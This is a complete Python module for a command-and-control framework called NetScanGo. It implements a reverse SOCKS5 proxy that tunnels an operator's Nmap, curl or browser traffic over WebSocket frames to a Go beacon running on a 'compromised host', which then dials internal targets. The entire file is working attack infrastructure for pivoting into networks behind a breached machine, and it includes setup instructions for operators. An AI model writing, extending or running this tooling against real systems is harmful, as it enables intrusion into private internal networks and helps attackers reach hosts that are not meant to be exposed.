"""
netscango/socks_bridge.py
─────────────────────────
Reverse SOCKS5 proxy bridge for the NetScanGo C2 framework.

Strict 9-Byte Frame Standard (RFC-defined layout)
──────────────────────────────────────────────────
  ┌────────┬───────────────┬───────────────┬──────────────────┐
  │ Byte 0 │  Bytes 1-4    │  Bytes 5-8    │  Bytes 9+        │
  │  Type  │   StreamID    │    Length     │   Payload        │
  │ 1 byte │  uint32 BE    │  uint32 BE    │  variable        │
  └────────┴───────────────┴───────────────┴──────────────────┘

  Total header = 9 bytes.  Struct format: "!BII"

Frame types (MUST stay in sync with beacon/proxy.go):
  0x01  CONNECT    C2 → Agent    payload = "host:port"  (open a new stream)
  0x02  DATA       bidirectional payload = raw TCP bytes
  0x03  CLOSE      bidirectional no payload             (tear down stream)
  0x04  CONNECTED  Agent → C2   no payload              (dial succeeded)
  0x05  ERROR      Agent → C2   payload = error string  (dial failed)

Architecture
────────────
    [Operator tool: Firefox / Nmap / curl / proxychains]
          │
          │  SOCKS5 (TCP 127.0.0.1:1080)
          ▼
    [SocksBridge — this module]   ← runs alongside Flask / Dash
          │
          │  WebSocket binary frames (TCP 0.0.0.0:8889/tunnel/<agent_id>)
          ▼
    [Go Beacon agent on compromised host]
          │
          │  raw TCP dial  net.Dial("tcp", "host:port")
          ▼
    [Internal target host:port]

SOCKS5 support:
    • No-auth only (RFC 1928 §3, method 0x00)
    • CONNECT command only (§6, cmd 0x01)
    • IPv4 (atyp 0x01), domain (atyp 0x03), IPv6 (atyp 0x04)

Dependencies:
    pip install websockets
"""

from __future__ import annotations

import asyncio
import itertools
import logging
import queue
import socket
import struct
import threading
from typing import Callable, Dict, Optional

try:
    import websockets
    import websockets.exceptions
    _HAS_WEBSOCKETS = True
except ImportError:
    _HAS_WEBSOCKETS = False

# ── Frame protocol constants ────────────────────────────────────────────────────
# EXACTLY matches the user's 9-byte spec:
#   Byte 0       = Type  (uint8)
#   Bytes 1 - 4  = StreamID (uint32 big-endian)
#   Bytes 5 - 8  = Length   (uint32 big-endian)

FRAME_CONNECT   = 0x01   # C2 → Agent: open new TCP circuit
FRAME_DATA      = 0x02   # bidirectional: raw TCP payload
FRAME_CLOSE     = 0x03   # bidirectional: close circuit
FRAME_CONNECTED = 0x04   # Agent → C2: dial succeeded
FRAME_ERROR     = 0x05   # Agent → C2: dial failed

# "!BII" = network byte order, uint8, uint32, uint32  →  1 + 4 + 4 = 9 bytes
_HDR      = struct.Struct("!BII")
HEADER_LEN = _HDR.size   # 9


def encode_frame(stream_id: int, ftype: int, payload: bytes = b"") -> bytes:
    """
    Pack a complete binary frame ready to send over WebSocket.

    Layout produced:
        [ftype: 1B][stream_id: 4B][len(payload): 4B][payload: NB]
    """
    return _HDR.pack(ftype, stream_id, len(payload)) + payload


def decode_header(raw: bytes):
    """
    Unpack the first HEADER_LEN bytes.

    Returns
    -------
    (ftype: int, stream_id: int, payload_len: int)
    """
    return _HDR.unpack(raw[:HEADER_LEN])


# ── Module-level shared state ──────────────────────────────────────────────────
# All access from outside goes through the SocksBridge public class.

_logger = logging.getLogger("socks_bridge")

# agent_id → active WebSocket connection object
_ws_sessions: Dict[str, object] = {}
_ws_lock = threading.Lock()

# stream_id → Queue[(ftype: int, payload: bytes)]
_stream_qs: Dict[int, "queue.Queue[tuple[int, bytes]]"] = {}
_stream_lock = threading.Lock()

# Monotonically increasing stream identifiers (start at 1)
_stream_gen = itertools.count(1)

# asyncio event loop running the WebSocket server (set at startup)
_loop: Optional[asyncio.AbstractEventLoop] = None


# ── WebSocket server ───────────────────────────────────────────────────────────

async def _ws_handler(websocket, *args) -> None:
    """
    Accept a WebSocket connection from the Go beacon.

    Expected URL path:  /tunnel/<agent_id>

    Compatible with websockets library versions < 10, 10-13, and >= 14.
    When the Go agent sends frames, this handler routes them to the
    correct per-stream queue so the synchronous SOCKS5 threads can
    pick up the DATA / CONNECTED / ERROR / CLOSE responses.
    """
    # Resolve path regardless of library version
    if args:
        path = args[0]
    elif hasattr(websocket, "request") and hasattr(websocket.request, "path"):
        path = websocket.request.path
    else:
        path = getattr(websocket, "path", "/")

    parts = path.strip("/").split("/")
    if len(parts) != 2 or parts[0] != "tunnel":
        await websocket.close(1008, "Expected path /tunnel/<agent_id>")
        return

    agent_id = parts[1]
    _logger.info("WebSocket tunnel OPEN  agent=%s", agent_id)

    with _ws_lock:
        _ws_sessions[agent_id] = websocket

    try:
        async for raw in websocket:
            if not isinstance(raw, (bytes, bytearray)) or len(raw) < HEADER_LEN:
                continue

            # Decode 9-byte header: Type(1B) | StreamID(4B) | Length(4B)
            ftype, stream_id, plen = decode_header(raw)
            payload = bytes(raw[HEADER_LEN: HEADER_LEN + plen])

            with _stream_lock:
                q = _stream_qs.get(stream_id)

            if q is not None:
                q.put_nowait((ftype, payload))
            else:
                _logger.debug(
                    "Stale frame  stream=%d  type=0x%02x — dropped",
                    stream_id, ftype,
                )

    except Exception:
        # Covers websockets ConnectionClosed and all network errors
        pass

    finally:
        with _ws_lock:
            _ws_sessions.pop(agent_id, None)
        _logger.info("WebSocket tunnel CLOSE  agent=%s", agent_id)


def _run_ws_server(host: str, port: int) -> None:
    """Entry-point for the WebSocket tunnel server background thread."""
    global _loop

    _loop = asyncio.new_event_loop()
    asyncio.set_event_loop(_loop)

    async def _serve() -> None:
        server = await websockets.serve(_ws_handler, host, port)  # type: ignore[attr-defined]
        _logger.info("WebSocket tunnel server listening on %s:%d", host, port)
        await asyncio.Future()   # run forever
        server.close()

    try:
        _loop.run_until_complete(_serve())
    except RuntimeError:
        pass  # loop.stop() called by SocksBridge.stop()
    finally:
        _loop.close()


# ── Helpers ────────────────────────────────────────────────────────────────────

def _recv_n(sock: socket.socket, n: int) -> bytes:
    """Read exactly n bytes from a blocking socket; raise EOFError on close."""
    buf = bytearray(n)
    mv  = memoryview(buf)
    got = 0
    while got < n:
        chunk = sock.recv_into(mv[got:], n - got)
        if not chunk:
            raise EOFError("Socket closed while reading")
        got += chunk
    return bytes(buf)


def _send_frame_sync(
    agent_id: str,
    stream_id: int,
    ftype: int,
    payload: bytes = b"",
) -> None:
    """
    Send a binary WebSocket frame from a regular synchronous thread.

    Uses ``asyncio.run_coroutine_threadsafe`` to safely cross the thread
    boundary into the asyncio event loop.  Blocks up to 15 s for delivery.

    Raises
    ------
    RuntimeError
        If there is no active WebSocket for ``agent_id`` or the event
        loop is not running.
    """
    with _ws_lock:
        ws = _ws_sessions.get(agent_id)
    if ws is None:
        raise RuntimeError(f"No open WebSocket tunnel for agent {agent_id!r}")
    if _loop is None or not _loop.is_running():
        raise RuntimeError("WebSocket event loop not running")

    frame = encode_frame(stream_id, ftype, payload)
    fut = asyncio.run_coroutine_threadsafe(ws.send(frame), _loop)  # type: ignore[arg-type]
    fut.result(timeout=15)


# ── SOCKS5 handshake (RFC 1928) ────────────────────────────────────────────────

def _socks5_handshake(sock: socket.socket) -> tuple[str, int]:
    """
    Drive the SOCKS5 negotiation and return ``(target_host, target_port)``.

    Supports:
        * No-auth (0x00) only — other methods rejected with 0xFF
        * CONNECT (0x01) command only — others rejected with REP=0x07
        * IPv4 (0x01), domain-name (0x03), IPv6 (0x04) address types
    """
    # ── greeting ──────────────────────────────────────────────────────────
    ver, nmethods = struct.unpack("BB", _recv_n(sock, 2))
    if ver != 5:
        raise ValueError(f"Not SOCKS5 (version byte {ver:#04x})")

    methods = set(_recv_n(sock, nmethods))
    if 0x00 not in methods:
        sock.sendall(b"\x05\xff")          # no acceptable method
        raise ValueError("Client requires authentication; only no-auth (0x00) supported")
    sock.sendall(b"\x05\x00")              # select no-auth

    # ── request ───────────────────────────────────────────────────────────
    ver, cmd, _rsv, atyp = struct.unpack("BBBB", _recv_n(sock, 4))
    if ver != 5:
        raise ValueError("Version mismatch in SOCKS5 request")
    if cmd != 0x01:
        # REP=0x07 = Command not supported
        sock.sendall(b"\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00")
        raise ValueError(f"Only CONNECT (0x01) supported; got {cmd:#04x}")

    if atyp == 0x01:      # IPv4 (4 bytes)
        host = socket.inet_ntoa(_recv_n(sock, 4))
    elif atyp == 0x03:    # domain name (1 length byte + N name bytes)
        dlen = _recv_n(sock, 1)[0]
        host = _recv_n(sock, dlen).decode("ascii", errors="replace")
    elif atyp == 0x04:    # IPv6 (16 bytes)
        host = socket.inet_ntop(socket.AF_INET6, _recv_n(sock, 16))
    else:
        sock.sendall(b"\x05\x08\x00\x01\x00\x00\x00\x00\x00\x00")  # REP=0x08
        raise ValueError(f"Unknown address type {atyp:#04x}")

    port = struct.unpack("!H", _recv_n(sock, 2))[0]
    return host, port


# ── Bidirectional pump ─────────────────────────────────────────────────────────

def _bidir_pump(
    client_sock: socket.socket,
    agent_id: str,
    stream_id: int,
    resp_q: "queue.Queue[tuple[int, bytes]]",
) -> None:
    """
    Shuttle bytes between the SOCKS5 client socket and the WebSocket stream.

    client → agent : a daemon thread reads from the socket and sends DATA frames.
    agent → client : the calling thread drains the response queue and writes.
    """
    stop = threading.Event()

    def pump_up() -> None:
        """Read from SOCKS5 client, forward as DATA frames to the agent."""
        client_sock.settimeout(1.0)
        try:
            while not stop.is_set():
                try:
                    chunk = client_sock.recv(4096)
                except socket.timeout:
                    continue
                except OSError:
                    break

                if not chunk:      # EOF from SOCKS5 client
                    try:
                        _send_frame_sync(agent_id, stream_id, FRAME_CLOSE)
                    except Exception:
                        pass
                    break

                try:
                    _send_frame_sync(agent_id, stream_id, FRAME_DATA, chunk)
                except Exception as exc:
                    _logger.debug("stream %d upstream error: %s", stream_id, exc)
                    break
        finally:
            stop.set()

    uploader = threading.Thread(
        target=pump_up, daemon=True, name=f"socks-up-{stream_id}"
    )
    uploader.start()

    try:
        while not stop.is_set():
            try:
                ftype, payload = resp_q.get(timeout=30)
            except queue.Empty:
                # 30 seconds of silence on an established circuit = dead
                _logger.debug("stream %d: idle timeout", stream_id)
                break

            if ftype == FRAME_DATA:
                try:
                    client_sock.sendall(payload)
                except OSError:
                    break
            elif ftype == FRAME_CLOSE:
                break
            # CONNECTED / ERROR / unknown — already handled before pump starts
    finally:
        stop.set()
        uploader.join(timeout=3)


# ── Stream handler ─────────────────────────────────────────────────────────────

def _handle_stream(client_sock: socket.socket, agent_id: str) -> None:
    """
    Drive one SOCKS5 session mapped to one proxy stream (circuit).

    Steps
    -----
    1. Perform SOCKS5 handshake → get (target_host, target_port).
    2. Generate a unique StreamID; register a response queue.
    3. Build a CONNECT frame (0x01) with payload "host:port" and send it
       down the WebSocket to the Go agent.
    4. Wait up to 15 s for a CONNECTED (0x04) or ERROR (0x05) frame.
    5. Reply to the SOCKS5 client; start bidirectional data pump.
    """
    stream_id = next(_stream_gen)
    resp_q: "queue.Queue[tuple[int, bytes]]" = queue.Queue()

    with _stream_lock:
        _stream_qs[stream_id] = resp_q

    try:
        # ── Step 1: SOCKS5 handshake ──────────────────────────────────────
        try:
            target_host, target_port = _socks5_handshake(client_sock)
        except Exception as exc:
            _logger.warning("SOCKS5 handshake failed (stream %d): %s", stream_id, exc)
            return

        _logger.info(
            "stream %d: CONNECT %s:%d  agent=%s",
            stream_id, target_host, target_port, agent_id,
        )

        # ── Step 2+3: send CONNECT frame ──────────────────────────────────
        # Frame: [0x01][stream_id: 4B][len: 4B]["host:port"]
        target_str = f"{target_host}:{target_port}".encode()
        try:
            _send_frame_sync(agent_id, stream_id, FRAME_CONNECT, target_str)
        except Exception as exc:
            _logger.error("stream %d: CONNECT frame failed: %s", stream_id, exc)
            # REP=0x01 general server failure
            client_sock.sendall(b"\x05\x01\x00\x01\x00\x00\x00\x00\x00\x00")
            return

        # ── Step 4: wait for CONNECTED / ERROR ────────────────────────────
        try:
            ftype, payload = resp_q.get(timeout=15)
        except queue.Empty:
            _logger.error("stream %d: timeout waiting for CONNECTED", stream_id)
            # REP=0x04 host unreachable
            client_sock.sendall(b"\x05\x04\x00\x01\x00\x00\x00\x00\x00\x00")
            return

        if ftype == FRAME_CONNECTED:
            # REP=0x00 success; BND.ADDR=0.0.0.0  BND.PORT=0
            client_sock.sendall(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00")
        elif ftype == FRAME_ERROR:
            errmsg = payload.decode(errors="replace")
            _logger.warning("stream %d: agent error: %s", stream_id, errmsg)
            # REP=0x05 connection refused
            client_sock.sendall(b"\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00")
            return
        else:
            _logger.error("stream %d: unexpected frame type 0x%02x", stream_id, ftype)
            client_sock.sendall(b"\x05\x01\x00\x01\x00\x00\x00\x00\x00\x00")
            return

        # ── Step 5: bidirectional pump ────────────────────────────────────
        _bidir_pump(client_sock, agent_id, stream_id, resp_q)

    finally:
        with _stream_lock:
            _stream_qs.pop(stream_id, None)
        try:
            client_sock.close()
        except OSError:
            pass
        _logger.info("stream %d closed", stream_id)


# ── SOCKS5 accept loop ─────────────────────────────────────────────────────────

def _accept_loop(
    srv: socket.socket,
    stop_evt: threading.Event,
    agent_provider: Callable[[], Optional[str]],
) -> None:
    """Accept SOCKS5 connections and dispatch each one to a daemon thread."""
    _logger.info("SOCKS5 accept loop started")
    srv.settimeout(1.0)

    while not stop_evt.is_set():
        try:
            client, addr = srv.accept()
        except socket.timeout:
            continue
        except OSError:
            break

        agent_id = agent_provider()
        if agent_id is None:
            _logger.warning(
                "SOCKS5 client %s rejected — no active tunnel agent", addr
            )
            try:
                # REP 0xFF = no acceptable method (reject at greeting level)
                client.sendall(b"\x05\xff")
            except OSError:
                pass
            client.close()
            continue

        threading.Thread(
            target=_handle_stream,
            args=(client, agent_id),
            daemon=True,
            name=f"socks5-{addr[0]}:{addr[1]}",
        ).start()

    try:
        srv.close()
    except OSError:
        pass
    _logger.info("SOCKS5 accept loop stopped")


# ── Public class ───────────────────────────────────────────────────────────────

class SocksBridge:
    """
    Manages a SOCKS5 proxy server and a WebSocket tunnel server that together
    implement a reverse SOCKS5 proxy through the Golang beacon.

    The frame protocol uses the strict 9-byte header layout:
        Byte 0      : Type   (uint8)   — 0x01 CONNECT, 0x02 DATA, 0x03 CLOSE
        Bytes 1-4   : StreamID (uint32 BE) — unique per TCP connection
        Bytes 5-8   : Length  (uint32 BE) — payload byte count

    Quick-start
    -----------
    ::

        from netscango.socks_bridge import SocksBridge

        bridge = SocksBridge()
        bridge.start(ws_port=8889, socks_port=1080)
        bridge.set_active_agent("abc123def456")   # agent_id from C2 registration

    The operator then configures proxychains / Firefox:
        SOCKS5 proxy → 127.0.0.1:1080

    The C2 server queues a ``start_proxy`` task to the agent, which calls back to::

        ws://<c2_host>:8889/tunnel/abc123def456

    and begins the multiplexed tunnel session.

    Dependency
    ----------
    ``pip install websockets``
    """

    def __init__(self) -> None:
        self._running     = False
        self._stop_evt    = threading.Event()
        self._active_agent: Optional[str] = None
        self._ws_port     = 8889
        self._socks_port  = 1080
        self.logger       = logging.getLogger("socks_bridge.SocksBridge")

    # ── lifecycle ──────────────────────────────────────────────────────────────

    def start(
        self,
        ws_host:    str = "0.0.0.0",
        ws_port:    int = 8889,
        socks_host: str = "127.0.0.1",
        socks_port: int = 1080,
    ) -> tuple[bool, str]:
        """
        Start both the WebSocket tunnel server and the SOCKS5 proxy server.

        Parameters
        ----------
        ws_host    : Interface for the WebSocket server (default: all interfaces).
        ws_port    : Port the Go beacon will connect back to (default 8889).
        socks_host : Interface for the SOCKS5 listener (default: localhost only).
        socks_port : Port proxychains / Firefox connects to (default 1080).

        Returns
        -------
        (success: bool, message: str)
        """
        if not _HAS_WEBSOCKETS:
            return False, (
                "The 'websockets' package is required. "
                "Run:  pip install websockets"
            )
        if self._running:
            return False, "SocksBridge is already running"

        self._ws_port    = ws_port
        self._socks_port = socks_port
        self._stop_evt.clear()

        # ── WebSocket tunnel server (asyncio in its own thread) ────────────
        threading.Thread(
            target=_run_ws_server,
            args=(ws_host, ws_port),
            daemon=True,
            name="c2-ws-tunnel",
        ).start()

        # ── SOCKS5 listener socket ─────────────────────────────────────────
        try:
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind((socks_host, socks_port))
            srv.listen(64)
        except OSError as exc:
            return False, (
                f"Cannot bind SOCKS5 server on {socks_host}:{socks_port} — {exc}"
            )

        threading.Thread(
            target=_accept_loop,
            args=(srv, self._stop_evt, lambda: self._active_agent),
            daemon=True,
            name="c2-socks5-accept",
        ).start()

        self._running = True
        self.logger.info(
            "SocksBridge started — WS=%s:%d  SOCKS5=%s:%d",
            ws_host, ws_port, socks_host, socks_port,
        )
        return True, (
            f"SocksBridge running — "
            f"WebSocket tunnel : {ws_host}:{ws_port}  |  "
            f"SOCKS5 proxy     : {socks_host}:{socks_port}"
        )

    def stop(self) -> tuple[bool, str]:
        """Stop both servers and clear the active agent."""
        if not self._running:
            return False, "SocksBridge is not running"

        self._stop_evt.set()
        self._active_agent = None

        # Signal the asyncio loop to exit
        if _loop is not None and _loop.is_running():
            _loop.call_soon_threadsafe(_loop.stop)

        self._running = False
        self.logger.info("SocksBridge stopped")
        return True, "SocksBridge stopped"

    # ── agent selection ────────────────────────────────────────────────────────

    def set_active_agent(self, agent_id: str) -> None:
        """Route all new SOCKS5 streams through this agent's WebSocket tunnel."""
        self._active_agent = agent_id
        self.logger.info("Active proxy agent → %s", agent_id)

    def clear_active_agent(self) -> None:
        """Stop routing new connections (existing streams are not torn down)."""
        self._active_agent = None
        self.logger.info("Active proxy agent cleared")

    # ── read-only properties ───────────────────────────────────────────────────

    @property
    def is_running(self) -> bool:
        return self._running

    @property
    def active_agent(self) -> Optional[str]:
        return self._active_agent

    @property
    def ws_port(self) -> int:
        return self._ws_port

    @property
    def socks_port(self) -> int:
        return self._socks_port
